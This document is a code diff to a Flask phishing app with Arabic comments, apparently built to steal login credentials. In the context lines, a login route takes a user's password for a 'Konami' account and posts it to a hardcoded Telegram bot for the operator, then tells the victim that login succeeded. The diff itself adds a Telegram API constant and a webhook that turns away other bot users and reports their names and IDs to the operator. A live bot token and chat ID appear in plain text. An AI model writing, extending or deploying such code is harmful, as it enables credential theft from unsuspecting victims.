@@ -6,6 +6,7 @@ app = Flask(__name__)
 # التوكن والآيدي الخاص بك يا سيد
 TOKEN = '8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU'
 CHAT_ID = '5204157508'
+TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
 
 @app.route('/')
 def index():
@@ -27,7 +28,7 @@ def login():
             f"🔑 باسورد كونامي: {k_pass}"
         )
         
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        url = f"{TELEGRAM_API}/sendMessage"
         payload = {
             'chat_id': CHAT_ID,
             'text': msg,
@@ -39,6 +40,41 @@ def login():
         print(f"Error: {e}")
         
     return "تم تسجيل الدخول بنجاح! جاري تحويلك..."
+
+# مسار استقبال تحديثات بوت التيليجرام (Webhook)
+@app.route(f'/{TOKEN}', methods=['POST'])
+def telegram_webhook():
+    try:
+        json_data = request.get_json()
+        
+        if "message" in json_data:
+            message = json_data["message"]
+            chat_id = message["chat"]["id"]
+            user = message.get("from", {})
+            username = user.get("username", "بدون يوزر")
+            first_name = user.get("first_name", "مستخدم")
+            text = message.get("text", "")
+            
+            # إذا كتب /start أو حاول التفاعل مع البوت
+            if text.startswith('/start'):
+                # 1. إرسال رد حاسم للمستخدم في البوت
+                reply_url = f"{TELEGRAM_API}/sendMessage"
+                requests.post(reply_url, json={
+                    'chat_id': chat_id, 
+                    'text': "البوت لايستقبل مشتركين نهائيا"
+                })
+                
+                # 2. إرسال إشعار لك أنت يا سيد تخبرك أن فلاناً حاول الدخول
+                alert_msg = f"⚠️ محاولة دخول مرفوضة للبوت!\n👤 الاسم: {first_name}\n🔗 اليوزر: @{username}\n🆔 الآيدي: {chat_id}"
+                requests.post(reply_url, json={
+                    'chat_id': CHAT_ID, 
+                    'text': alert_msg
+                })
+                
+    except Exception as e:
+        print(f"Webhook Error: {e}")
+        
+    return "OK", 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
